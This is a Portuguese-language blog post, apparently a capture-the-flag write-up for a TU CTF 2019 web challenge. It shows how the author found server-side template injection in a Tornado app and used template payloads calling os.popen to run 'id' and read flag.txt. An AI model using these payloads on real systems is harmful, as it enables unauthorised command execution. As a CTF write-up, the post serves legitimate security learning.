---
layout: post
title:  And Now, For Something Completely Different - TU CTF 2019
image: ''
date:   2020-06-04
tags:
- ctf
- writeup
- web
description: 'And Now, For Something Completely Different - Writeup'
categories:
- WRITEUP 2019
- CTF
---
**Category: Web**

### Description:
```
We all know Black Friday is the time for shopping. Can you find us a flag on this online store?

chall.tuctf.com:30007
```
<img src="/assets/img/writeups/2019/TU CTF/Web/And-Now-For-Something-Completely-Different/andnow0.png"/>

### Solve:
Acessando o link:
<img src="/assets/img/writeups/2019/TU CTF/Web/And-Now-For-Something-Completely-Different/andnow1.png" />
Analisando o código fonte encontramos um diretório:
<img src="/assets/img/writeups/2019/TU CTF/Web/And-Now-For-Something-Completely-Different/andnow2.png" />
E, acessando o "/welcome/test", temos:
<img src="/assets/img/writeups/2019/TU CTF/Web/And-Now-For-Something-Completely-Different/andnow3.png" />
Depois de testar alguns payloads, cheguei ao Server-Side Template Injection (SSTI) com o payload :
```python
{ {7*7} }
```
<img src="/assets/img/writeups/2019/TU CTF/Web/And-Now-For-Something-Completely-Different/andnow4.png" />
E descobri que estava rodando Tornado no servidor, pois em um dos payloads que eu testei me foi retornado um erro com o path do Tornado e assim procurei outros payloads para o Tornado.Usei:
```python
{ % import os % } { { os.popen("id").read() }}
```
<img src="/assets/img/writeups/2019/TU CTF/Web/And-Now-For-Something-Completely-Different/andnow5.png" />
E assim, obti a flag com o payload:
```python
{ % import os % } { {os.popen( "cat flag.txt" ).read()}}
```
<script src="https://gist.github.com/73735/80753105720b2d26d55bf23d68f2c426.js"></script>
<img src="/assets/img/writeups/2019/TU CTF/Web/And-Now-For-Something-Completely-Different/andnow6.png" />

### Flag:
```TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465}```
